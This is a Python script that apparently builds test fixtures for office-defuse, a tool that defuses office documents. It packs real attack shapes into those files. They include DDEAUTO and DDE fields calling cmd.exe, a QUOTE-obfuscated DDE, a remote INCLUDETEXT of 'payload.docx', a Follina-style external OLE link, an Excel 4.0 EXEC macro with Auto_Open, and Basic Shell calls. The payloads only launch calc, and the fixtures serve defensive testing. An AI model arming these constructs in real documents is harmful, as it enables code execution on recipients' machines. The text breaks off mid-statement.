#!/usr/bin/env python3
# Rebuilds test/fixtures. Needs LibreOffice (soffice), Python 3 and Info-ZIP zip:
#
#   python3 -I scripts/make-fixtures.py
#   python3 -I scripts/make-fixtures.py cases    # cases/ alone, which needs only Python
#   python3 -I scripts/make-fixtures.py media    # media/ alone, which needs only Python
#
# lo/     LibreOffice exports of the flat ODF sources below, as LibreOffice writes them, in OOXML, ODF, the binary
#         formats and RTF.
# docs/   LibreOffice exports with macros, fields, relationships, objects and controls added with zipfile, and
#         packages LibreOffice cannot write (Visio, .xlam, .odb), built by hand.
# zip/    Archives built byte by byte to break one rule of the ZIP format each.
# ole/    Word, Excel, PowerPoint, Visio, Outlook, Publisher and Project files and encrypted packages, written byte by
#         byte with the compound file writer below. Encryption uses fixed salts and keys, so a rebuild writes the same
#         bytes.
# rtf/    RTF files with objects, fields, links and the obfuscations rtfobj documents.
# cfb/    Compound files that each break one rule of MS-CFB.
# media/  Packages and RTF files holding pictures, which go to the file plugins, beside the printer settings and
#         obfuscated fonts of the format itself, which do not.
# cases/  One package for each behavior the corpus census found. A rebuild writes the same bytes.
#         manifest.json, kept by hand, gives each file's issue and what office-defuse reports.
#
# LibreOffice, zipfile and Info-ZIP write the time they run into each archive entry, and LibreOffice writes random
# revision ids. The script seeds LibreOffice's random numbers and sets every entry's time to 2026-01-01, so a rebuild
# writes the same bytes.
import base64
import hashlib
import hmac
import io
import json
import os
import re
import shutil
import struct
import subprocess
import sys
import tempfile
import zipfile
import zlib

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
OUT = os.path.join(ROOT, 'test', 'fixtures')
TMP = tempfile.mkdtemp(prefix='office-defuse-fixtures-')

# A compound file header and nothing else. In a ZIP package, office-defuse checks only an OLE part's signature.
FAKE_OLE = bytes.fromhex('d0cf11e0a1b11ae1') + bytes(504)

W = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'
R = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'
RT = R + '/'
MSR = 'http://schemas.microsoft.com/office/2006/relationships/'

NS_ODF = (
    'xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
    'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" '
    'xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" '
    'xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" '
    'xmlns:svg="urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0" '
    'xmlns:presentation="urn:oasis:names:tc:opendocument:xmlns:presentation:1.0" '
    'xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" '
    'xmlns:xlink="http://www.w3.org/1999/xlink" '
    'xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2"'
)

SOURCES = {
    'doc.fodt': '''<?xml version="1.0" encoding="UTF-8"?>
<office:document %s office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.text">
 <office:body><office:text>
  <text:h text:outline-level="1">Fixture</text:h>
  <text:p>A plain document with a <text:a xlink:type="simple" xlink:href="https://example.com/about">web link</text:a> and a <text:a xlink:type="simple" xlink:href="mailto:someone@example.com">mail link</text:a>.</text:p>
 </office:text></office:body>
</office:document>
''' % NS_ODF,
    'sheet.fods': '''<?xml version="1.0" encoding="UTF-8"?>
<office:document %s office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.spreadsheet">
 <office:body><office:spreadsheet><table:table table:name="Sheet1">
  <table:table-row><table:table-cell office:value-type="float" office:value="2"><text:p>2</text:p></table:table-cell><table:table-cell office:value-type="float" office:value="3"><text:p>3</text:p></table:table-cell><table:table-cell table:formula="of:=SUM([.A1:.B1])" office:value-type="float" office:value="5"><text:p>5</text:p></table:table-cell></table:table-row>
 </table:table></office:spreadsheet></office:body>
</office:document>
''' % NS_ODF,
    'pres.fodp': '''<?xml version="1.0" encoding="UTF-8"?>
<office:document %s office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.presentation">
 <office:body><office:presentation>
  <draw:page draw:name="page1"><draw:frame svg:x="2cm" svg:y="2cm" svg:width="12cm" svg:height="3cm"><draw:text-box><text:p>Slide one, <text:a xlink:type="simple" xlink:href="https://example.com/">a link</text:a></text:p></draw:text-box></draw:frame></draw:page>
 </office:presentation></office:body>
</office:document>
''' % NS_ODF,
    'draw.fodg': '''<?xml version="1.0" encoding="UTF-8"?>
<office:document %s office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.graphics">
 <office:body><office:drawing>
  <draw:page draw:name="page1"><draw:rect svg:x="2cm" svg:y="2cm" svg:width="4cm" svg:height="3cm"><text:p>Box</text:p></draw:rect></draw:page>
 </office:drawing></office:body>
</office:document>
''' % NS_ODF,
    'formula.mml': '''<?xml version="1.0" encoding="UTF-8"?>
<math xmlns="http://www.w3.org/1998/Math/MathML"><mrow><mi>a</mi><mo>+</mo><mi>b</mi></mrow></math>
''',
    'links.fodt': '''<?xml version="1.0" encoding="UTF-8"?>
<office:document %s office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.text">
 <office:body><office:text>
  <text:p><text:a xlink:type="simple" xlink:href="https://example.com/page">web</text:a>, <text:a xlink:type="simple" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document">macro</text:a>, <text:a xlink:type="simple" xlink:href="http://192.168.10.20/login">raw address</text:a>, <text:a xlink:type="simple" xlink:href="https://user@example.com/">credentials</text:a>.</text:p>
 </office:text></office:body>
</office:document>
''' % NS_ODF,
    'dde.fodt': '''<?xml version="1.0" encoding="UTF-8"?>
<office:document %s office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.text">
 <office:body><office:text>
  <text:dde-connection-decls><text:dde-connection-decl office:name="calc" office:dde-application="cmd" office:dde-topic="/c calc" office:dde-item="x" office:automatic-update="true"/></text:dde-connection-decls>
  <text:p>DDE: <text:dde-connection text:connection-name="calc">value</text:dde-connection></text:p>
 </office:text></office:body>
</office:document>
''' % NS_ODF,
    'dde.fods': '''<?xml version="1.0" encoding="UTF-8"?>
<office:document %s office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.spreadsheet">
 <office:body><office:spreadsheet><table:table table:name="Sheet1">
  <table:table-row><table:table-cell table:formula="of:=DDE(&quot;cmd&quot;;&quot;/c calc&quot;;&quot;x&quot;)"><text:p>0</text:p></table:table-cell><table:table-cell table:formula="of:=&quot;DDE(&quot;&amp;&quot;text&quot;"><text:p>DDE(text</text:p></table:table-cell></table:table-row>
 </table:table></office:spreadsheet></office:body>
</office:document>
''' % NS_ODF,
}

# (source, output name, conversion target)
EXPORTS = [
    ('doc.fodt', 'clean.docx', 'docx'),
    ('doc.fodt', 'clean.docm', 'docm'),
    ('doc.fodt', 'clean.dotx', 'dotx'),
    ('doc.fodt', 'clean.odt', 'odt'),
    ('doc.fodt', 'clean.ott', 'ott'),
    ('sheet.fods', 'clean.xlsx', 'xlsx'),
    ('sheet.fods', 'clean.xltx', 'xltx'),
    ('sheet.fods', 'clean.ods', 'ods'),
    ('sheet.fods', 'clean.ots', 'ots'),
    ('pres.fodp', 'clean.pptx', 'pptx'),
    ('pres.fodp', 'clean.potx', 'potx'),
    ('pres.fodp', 'clean.odp', 'odp'),
    ('pres.fodp', 'clean.otp', 'otp'),
    ('draw.fodg', 'clean.odg', 'odg'),
    ('draw.fodg', 'clean.otg', 'otg'),
    ('formula.mml', 'clean.odf', 'odf'),
    ('links.fodt', 'links.docx', 'docx'),
    ('links.fodt', 'links.odt', 'odt'),
    ('dde.fodt', 'dde.odt', 'odt'),
    ('dde.fods', 'dde.ods', 'ods'),
    ('doc.fodt', 'clean.doc', 'doc'),
    ('doc.fodt', 'clean.rtf', 'rtf'),
    ('sheet.fods', 'clean.xls', 'xls'),
    ('pres.fodp', 'clean.ppt', 'ppt'),
    ('links.fodt', 'links.doc', 'doc'),
    ('links.fodt', 'links.rtf', 'rtf'),
    ('dde.fods', 'dde.xls', 'xls'),
]


def out(*parts):
    path = os.path.join(OUT, *parts)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    return path


def soffice_exports():
    src = os.path.join(TMP, 'src')
    os.makedirs(src)
    for name, text in SOURCES.items():
        with open(os.path.join(src, name), 'w', encoding='ascii') as f:
            f.write(text)
    profile = 'file://' + os.path.join(TMP, 'profile')
    for source, name, target in EXPORTS:
        work = os.path.join(TMP, 'convert', name)
        os.makedirs(work)
        # SAL_RAND_REPEATABLE seeds LibreOffice's random numbers, which it writes as revision ids.
        subprocess.run(
            ['soffice', '-env:UserInstallation=' + profile, '--headless', '--convert-to', target, '--outdir', work, os.path.join(src, source)],
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=180, env=dict(os.environ, SAL_RAND_REPEATABLE='1'),
        )
        produced = [f for f in os.listdir(work) if f.endswith('.' + target)]
        if len(produced) != 1:
            sys.exit('soffice made no %s from %s' % (target, source))
        shutil.copyfile(os.path.join(work, produced[0]), out('lo', name))
        fixed_ids(out('lo', name))
        fixed_times(out('lo', name))


def fixed_times(path):
    """Sets the date and time of every entry of the ZIP archive at `path` to 2026-01-01 00:00, in its local headers
    and its central directory, and changes nothing else. LibreOffice, zipfile and Info-ZIP write the time they run."""
    try:
        with zipfile.ZipFile(path) as z:
            infos, start = z.infolist(), z.start_dir
    except (zipfile.BadZipFile, OSError, ValueError, NotImplementedError, EOFError):
        return
    with open(path, 'rb') as f:
        data = bytearray(f.read())
    when = (0, ((2026 - 1980) << 9) | (1 << 5) | 1)
    for info in infos:
        if data[info.header_offset:info.header_offset + 4] == b'PK\x03\x04':
            struct.pack_into('<HH', data, info.header_offset + 10, *when)
    at = start
    while data[at:at + 4] == b'PK\x01\x02':
        struct.pack_into('<HH', data, at + 12, *when)
        at += 46 + sum(struct.unpack_from('<HHH', data, at + 28))
    with open(path, 'wb') as f:
        f.write(data)


def fixed_ids(path):
    """LibreOffice gives each slide number field a random GUID. This writes fixed ones in their place, deflates again
    only the entries that change, and keeps every other byte of LibreOffice's archive."""
    with open(path, 'rb') as f:
        data = f.read()
    try:
        z = zipfile.ZipFile(io.BytesIO(data))
    except zipfile.BadZipFile:
        return
    infos, count = z.infolist(), [0]

    def guid(_):
        count[0] += 1
        return b'id="{00000000-0000-4000-8000-%012X}"' % count[0]
    out, offsets, changed = bytearray(), [], {}
    for k, info in enumerate(infos):
        end = infos[k + 1].header_offset if k + 1 < len(infos) else z.start_dir
        raw = data[info.header_offset:end]
        content = z.read(info)
        fixed = re.sub(rb'id="\{[0-9A-Fa-f-]{36}\}"', guid, content)
        if fixed != content:
            n, m = struct.unpack_from('<HH', raw, 26)
            head = bytearray(raw[:30 + n + m])
            tail = raw[30 + n + m + info.compress_size:]
            deflate = zlib.compressobj(6, zlib.DEFLATED, -15)
            payload = deflate.compress(fixed) + deflate.flush()
            crc = zlib.crc32(fixed) & 0xffffffff
            if info.flag_bits & 8:
                signed = tail[:4] == b'PK\x07\x08'
                tail = (b'PK\x07\x08' if signed else b'') + struct.pack('<III', crc, len(payload), len(fixed))
            else:
                struct.pack_into('<III', head, 14, crc, len(payload), len(fixed))
            raw = bytes(head) + payload + tail
            changed[k] = (crc, len(payload), len(fixed))
        offsets.append(len(out))
        out += raw
    if not changed:
        return
    end_at = data.rindex(b'PK\x05\x06')
    cd = bytearray(data[z.start_dir:end_at])
    at = 0
    for k in range(len(infos)):
        struct.pack_into('<I', cd, at + 42, offsets[k])
        if k in changed:
            struct.pack_into('<III', cd, at + 16, *changed[k])
        at += 46 + sum(struct.unpack_from('<HHH', cd, at + 28))
    end = bytearray(data[end_at:])
    struct.pack_into('<I', end, 16, len(out))
    with open(path, 'wb') as f:
        f.write(bytes(out) + bytes(cd) + bytes(end))


def read_zip(path):
    with zipfile.ZipFile(path) as z:
        return [(i, z.read(i.filename)) for i in z.infolist()]


def zip_bytes(items):
    """(ZipInfo or name, bytes) pairs in order, as a ZIP archive. ODF's mimetype goes in stored, the rest deflated."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        for info, data in items:
            name = info.filename if isinstance(info, zipfile.ZipInfo) else info
            method = zipfile.ZIP_STORED if name == 'mimetype' else zipfile.ZIP_DEFLATED
            zi = zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0))
            zi.compress_type = method
            z.writestr(zi, data)
    return buf.getvalue()


def write_zip(path, items):
    with open(path, 'wb') as f:
        f.write(zip_bytes(items))


def edit(src, dst, replace=None, add=None, insert=None):
    """Copies a package. `replace` maps names to new bytes, `add` appends (name, bytes) entries, and `insert` maps a
    name to (marker, text) pairs: text goes in before the last occurrence of marker."""
    replace = replace or {}
    insert = insert or {}
    items = []
    for info, data in read_zip(src):
        name = info.filename
        if name in replace:
            data = replace[name]
        for marker, text in insert.get(name, []):
            s = data.decode('utf-8')
            at = s.rindex(marker)
            data = (s[:at] + text + s[at:]).encode('utf-8')
        items.append((name, data))
    names = {n for n, _ in items}
    for name, data in add or []:
        if name in names:
            sys.exit('%s already has %s' % (src, name))
        items.append((name, data))
    write_zip(dst, items)


def ct_override(part, ctype):
    return '<Override PartName="/%s" ContentType="%s"/>' % (part, ctype)


def rel(rid, rtype, target, external=False):
    return '<Relationship Id="%s" Type="%s" Target="%s"%s/>' % (rid, rtype, target, ' TargetMode="External"' if external else '')


def rels(*items):
    return ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">%s</Relationships>' % ''.join(items)).encode()


def word_document(body):
    return ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<w:document xmlns:w="%s" xmlns:r="%s" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:v="urn:schemas-microsoft-com:vml"><w:body>%s<w:sectPr/></w:body></w:document>' % (W, R, body)).encode()


def run(text):
    return '<w:r><w:t xml:space="preserve">%s</w:t></w:r>' % text


def complex_field(*instr, result='result'):
    """A field written the way Word writes most fields: begin, instruction runs, separate, result, end."""
    runs = ''.join('<w:r><w:instrText xml:space="preserve">%s</w:instrText></w:r>' % i for i in instr)
    return '<w:r><w:fldChar w:fldCharType="begin"/></w:r>%s<w:r><w:fldChar w:fldCharType="separate"/></w:r>%s<w:r><w:fldChar w:fldCharType="end"/></w:r>' % (runs, run(result))


def with_r(xml):
    """Declares the relationships prefix on a Word part's root, which LibreOffice leaves out when it has no use for it."""
    s = xml.decode() if isinstance(xml, bytes) else xml
    root = s.index('<w:', s.index('?>'))
    head = s[root:s.index('>', root)]
    if 'xmlns:r=' not in head:
        s = s[:root] + s[root:].replace(' ', ' xmlns:r="%s" ' % R, 1)
    return s.encode()


def docs():
    lo = lambda name: out('lo', name)
    with zipfile.ZipFile(lo('clean.docx')) as z:
        settings = with_r(z.read('word/settings.xml'))
    # Word: VBA project with its vbaData part, the way Word stores a .docm's macros.
    edit(lo('clean.docm'), out('docs', 'vba.docm'),
         insert={'[Content_Types].xml': [('</Types>', ct_override('word/vbaProject.bin', 'application/vnd.ms-office.vbaProject') + ct_override('word/vbaData.xml', 'application/vnd.ms-word.vbaData+xml'))],
                 'word/_rels/document.xml.rels': [('</Relationships>', rel('rIdVba', MSR + 'vbaProject', 'vbaProject.bin'))]},
         add=[('word/vbaProject.bin', FAKE_OLE),
              ('word/_rels/vbaProject.bin.rels', rels(rel('rId1', MSR + 'wordVbaData', 'vbaData.xml'))),
              ('word/vbaData.xml', b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<wne:vbaSuppData xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml"><wne:mcds/></wne:vbaSuppData>')])

    # Word fields: DDEAUTO split over runs and hidden with a character reference, DDE in a simple field, the QUOTE
    # trick, an include from a web server, a macro button and a HYPERLINK field to a share.
    body = ''.join([
        '<w:p>%s</w:p>' % complex_field(' DD', 'E&#65;UTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe" '),
        '<w:p><w:fldSimple w:instr=" DDE cmd &quot;/c notepad&quot; x">%s</w:fldSimple></w:p>' % run('simple'),
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>%s<w:r><w:instrText xml:space="preserve"> c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>%s<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>' % (complex_field(' QUOTE 68 68 69 65 85 84 79 ', result='DDEAUTO'), run('computed')),
        '<w:p>%s</w:p>' % complex_field(' INCLUDETEXT "http://203.0.113.9/payload.docx" '),
        '<w:p>%s</w:p>' % complex_field(' MACROBUTTON AutoOpen Double-click here '),
        '<w:p>%s</w:p>' % complex_field(' HYPERLINK "\\\\\\\\fileserver\\\\share\\\\notes.docx" '),
        '<w:p>%s</w:p>' % complex_field(' PAGE '),
    ])
    edit(lo('clean.docx'), out('docs', 'fields.docx'), replace={'word/document.xml': word_document(body)})

    # Word: relationships that reach outside the package. A remote template, the Follina shape of an external OLE
    # object, a remote image, a frame, a sub-document, a local template and an unknown type.
    edit(lo('clean.docx'), out('docs', 'external.docx'),
         replace={'word/settings.xml': settings},
         insert={'word/_rels/document.xml.rels': [('</Relationships>', ''.join([
             rel('rIdOle', RT + 'oleObject', 'http://203.0.113.9/exploit.html!', True),
             rel('rIdImg', RT + 'image', 'https://tracker.example.net/pixel.png', True),
             rel('rIdFrame', RT + 'frame', 'https://example.net/frame.html', True),
             rel('rIdSub', RT + 'subDocument', '\\\\fileserver\\docs\\chapter.docx', True),
             rel('rIdOdd', 'http://example.com/relationships/unknown', 'https://example.net/odd', True),
         ]))],
                 'word/settings.xml': [('</w:settings>', '<w:attachedTemplate r:id="rIdTpl"/>')]},
         add=[('word/_rels/settings.xml.rels', rels(rel('rIdTpl', RT + 'attachedTemplate', 'https://templates.example.net/report.dotm', True)))])
    edit(lo('clean.docx'), out('docs', 'local-template.docx'),
         replace={'word/settings.xml': settings},
         insert={'word/settings.xml': [('</w:settings>', '<w:attachedTemplate r:id="rIdTpl"/>')]},
         add=[('word/_rels/settings.xml.rels', rels(rel('rIdTpl', RT + 'attachedTemplate', 'file:///C:/Users/someone/Templates/Report.dotx', True)))])

    # Word: an embedded OLE object, an embedded workbook, an OLE file behind an image relationship, and an ActiveX
    # control with its binary.
    ole_body = '<w:p><w:r><w:object><o:OLEObject Type="Embed" ProgID="Package" ShapeID="_x0000_i1025" DrawAspect="Icon" ObjectID="_1" r:id="rIdOle"/></w:object></w:r><w:r><w:control r:id="rIdCtl" w:name="CommandButton1"/></w:r></w:p>'
    edit(lo('clean.docx'), out('docs', 'objects.docx'),
         replace={'word/document.xml': word_document(ole_body)},
         insert={'[Content_Types].xml': [('</Types>', ''.join([
             ct_override('word/embeddings/oleObject1.bin', 'application/vnd.openxmlformats-officedocument.oleObject'),
             ct_override('word/embeddings/Book1.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'),
             ct_override('word/media/image1.png', 'image/png'),
             ct_override('word/activeX/activeX1.xml', 'application/vnd.ms-office.activeX+xml'),
             ct_override('word/activeX/activeX1.bin', 'application/vnd.ms-office.activeX'),
         ]))],
                 'word/_rels/document.xml.rels': [('</Relationships>', ''.join([
                     rel('rIdOle', RT + 'oleObject', 'embeddings/oleObject1.bin'),
                     rel('rIdPkg', RT + 'package', 'embeddings/Book1.xlsx'),
                     rel('rIdImg', RT + 'image', 'media/image1.png'),
                     rel('rIdCtl', RT + 'control', 'activeX/activeX1.xml'),
                 ]))]},
         add=[('word/embeddings/oleObject1.bin', FAKE_OLE),
              ('word/embeddings/Book1.xlsx', open(lo('clean.xlsx'), 'rb').read()),
              ('word/media/image1.png', FAKE_OLE),
              ('word/activeX/activeX1.xml', b'<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n<ax:ocx ax:classid="{D7053240-CE69-11CD-A777-00DD01143C57}" ax:persistence="persistStorage" r:id="rId1" xmlns:ax="http://schemas.microsoft.com/office/2006/activeX" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>'),
              ('word/activeX/_rels/activeX1.xml.rels', rels(rel('rId1', MSR + 'activeXControlBinary', 'activeX1.bin'))),
              ('word/activeX/activeX1.bin', FAKE_OLE)])

    # Word: a ribbon that calls macros.
    edit(lo('clean.docm'), out('docs', 'customui.docm'),
         insert={'_rels/.rels': [('</Relationships>', rel('rIdUi', 'http://schemas.microsoft.com/office/2007/relationships/ui/extensibility', 'customUI/customUI14.xml'))]},
         add=[('customUI/customUI14.xml', b'<?xml version="1.0" encoding="UTF-8"?>\n<customUI xmlns="http://schemas.microsoft.com/office/2009/07/customui" onLoad="RibbonLoaded"><ribbon><tabs><tab id="t1" label="Tools"><group id="g1" label="Run"><button id="b1" label="Go" onAction="DoIt"/><button idMso="Copy"/></group></tab></tabs></ribbon></customUI>')])

    # PowerPoint: action settings that run a program, run a macro and activate an object.
    with zipfile.ZipFile(lo('clean.pptx')) as z:
        slide = z.read('ppt/slides/slide1.xml').decode()
    slide = slide.replace('<p:cNvPr id="2"', '<p:cNvPr id="2"', 1)
    marker = '<p:cNvPr '
    at = slide.index(marker)
    close = slide.index('>', at)
    actions = '<a:hlinkClick r:id="rIdRun" action="ppaction://program"/><a:hlinkHover r:id="" action="ppaction://macro?name=Module1.Show"/>'
    if slide[close - 1] == '/':
        slide = slide[:close - 1] + '>' + actions + '</p:cNvPr>' + slide[close + 1:]
    else:
        slide = slide[:close + 1] + actions + slide[close + 1:]
    edit(lo('clean.pptx'), out('docs', 'actions.pptx'),
         replace={'ppt/slides/slide1.xml': slide.encode()},
         insert={'ppt/slides/_rels/slide1.xml.rels': [('</Relationships>', rel('rIdRun', RT + 'hyperlink', 'file:///C:/Windows/System32/calc.exe', True))]})

    # Excel: a DDE link, a DDE formula, a remote workbook link, an Excel 4.0 macro sheet with Auto_Open, a shape
    # that runs a macro and a form control's VML macro.
    with zipfile.ZipFile(lo('clean.xlsx')) as z:
        sheet = z.read('xl/worksheets/sheet1.xml').decode()
        workbook = z.read('xl/workbook.xml').decode()
    sheet = sheet.replace('</sheetData>', '<row r="5"><c r="A5"><f>cmd|\' /c calc\'!A0</f><v>0</v></c><c r="B5" t="str"><f>"a|b"&amp;\'x|y\'!A1</f><v>a|b</v></c></row></sheetData>', 1)
    sheet = sheet.replace('</worksheet>', '<drawing r:id="rIdDr"/><legacyDrawing r:id="rIdVml"/></worksheet>')
    if 'xmlns:r=' not in sheet.split('>', 2)[1]:
        sheet = sheet.replace('<worksheet ', '<worksheet xmlns:r="%s" ' % R, 1)
    workbook = workbook.replace('</sheets>', '<sheet name="Macro1" sheetId="9" state="hidden" r:id="rIdXlm"/></sheets><definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName></definedNames>', 1)
    workbook = workbook.replace('<definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName></definedNames><definedNames>', '<definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName>')
    staged = os.path.join(TMP, 'excel.xlsx')
    edit(lo('clean.xlsx'), staged,
         replace={'xl/worksheets/sheet1.xml': sheet.encode(), 'xl/workbook.xml': workbook.encode()},
         insert={'[Content_Types].xml': [('</Types>', ''.join([
             ct_override('xl/externalLinks/externalLink1.xml', 'application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml'),
             ct_override('xl/externalLinks/externalLink2.xml', 'application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml'),
             ct_override('xl/macrosheets/sheet1.xml', 'application/vnd.ms-excel.macrosheet+xml'),
             ct_override('xl/drawings/drawing1.xml', 'application/vnd.openxmlformats-officedocument.drawing+xml'),
             ct_override('xl/drawings/vmlDrawing1.vml', 'application/vnd.openxmlformats-officedocument.vmlDrawing'),
         ]))],
                 'xl/_rels/workbook.xml.rels': [('</Relationships>', ''.join([
                     rel('rIdExt1', RT + 'externalLink', 'externalLinks/externalLink1.xml'),
                     rel('rIdExt2', RT + 'externalLink', 'externalLinks/externalLink2.xml'),
                     rel('rIdXlm', MSR + 'xlMacrosheet', 'macrosheets/sheet1.xml'),
                 ]))]},
         add=[('xl/externalLinks/externalLink1.xml', b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><ddeLink ddeService="cmd" ddeTopic=" /c calc"><ddeItems><ddeItem name="A0" advise="1"/></ddeItems></ddeLink></externalLink>'),
              ('xl/externalLinks/externalLink2.xml', ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="%s"><externalBook r:id="rId1"/></externalLink>' % R).encode()),
              ('xl/externalLinks/_rels/externalLink2.xml.rels', rels(rel('rId1', RT + 'externalLinkPath', 'https://files.example.net/prices.xlsx', True))),
              ('xl/macrosheets/sheet1.xml', b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<xm:macrosheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><sheetData><row r="1"><c r="A1"><f>EXEC("calc.exe")</f></c></row><row r="2"><c r="A2"><f>HALT()</f></c></row></sheetData></xm:macrosheet>'),
              ('xl/worksheets/_rels/sheet1.xml.rels', rels(rel('rIdDr', RT + 'drawing', '../drawings/drawing1.xml'), rel('rIdVml', RT + 'vmlDrawing', '../drawings/vmlDrawing1.vml'))),
              ('xl/drawings/drawing1.xml', b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"><xdr:twoCellAnchor><xdr:from><xdr:col>1</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>1</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:from><xdr:to><xdr:col>3</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>3</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:to><xdr:sp macro="[0]!Module1.Run" textlink=""><xdr:nvSpPr><xdr:cNvPr id="2" name="Button"/><xdr:cNvSpPr/></xdr:nvSpPr><xdr:spPr/></xdr:sp><xdr:clientData/></xdr:twoCellAnchor></xdr:wsDr>'),
              ('xl/drawings/vmlDrawing1.vml', b'<xml xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel"><v:shape id="_x0000_s1025" type="#_x0000_t201"><x:ClientData ObjectType="Button"><x:Anchor>1, 0, 1, 0, 3, 0, 3, 0</x:Anchor><x:FmlaMacro>[0]!Module1.Click</x:FmlaMacro></x:ClientData></v:shape></xml>')])
    retype(staged, out('docs', 'excel.xlsm'), 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml', 'application/vnd.ms-excel.sheet.macroEnabled.main+xml')

    # OpenDocument: Basic, dialogs and scripts folders, an on-open event, a LibreLogo mouse-over event, menus.
    with zipfile.ZipFile(lo('clean.odt')) as z:
        content = z.read('content.xml').decode()
        manifest = z.read('META-INF/manifest.xml').decode()
    content = content.replace('<office:scripts/>', '<office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:type="simple" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"/></office:event-listeners></office:scripts>', 1)
    content = content.replace('</text:a>', '<office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:mouseover" xlink:type="simple" xlink:href="vnd.sun.star.script:LibreLogo|LibreLogo.py$run?language=Python&amp;location=share"/></office:event-listeners></text:a>', 1)
    basic_lc = b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">\n<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">\n <library:library library:name="Standard" library:link="false"/>\n</library:libraries>'
    basic_lb = b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "library.dtd">\n<library:library xmlns:library="http://openoffice.org/2000/library" library:name="Standard" library:readonly="false" library:passwordprotected="false">\n <library:element library:name="Module1"/>\n</library:library>'
    basic_mod = b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">\n<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">Sub Main\n  Shell("calc")\nEnd Sub\n</script:module>'
    dialog = b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE dlg:window PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "dialog.dtd">\n<dlg:window xmlns:dlg="http://openoffice.org/2000/dialog" xmlns:script="http://openoffice.org/2000/script" dlg:id="Dialog1" dlg:left="0" dlg:top="0" dlg:width="100" dlg:height="50"/>'
    menubar = b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE menu:menubar PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "menubar.dtd">\n<menu:menubar xmlns:menu="http://openoffice.org/2001/menu" menu:id="menubar"><menu:menu menu:id=".uno:PickList"/></menu:menubar>'
    listed = ''.join('<manifest:file-entry manifest:full-path="%s" manifest:media-type="%s"/>' % e for e in [
        ('Basic/script-lc.xml', 'text/xml'), ('Basic/Standard/script-lb.xml', 'text/xml'), ('Basic/Standard/Module1.xml', 'text/xml'),
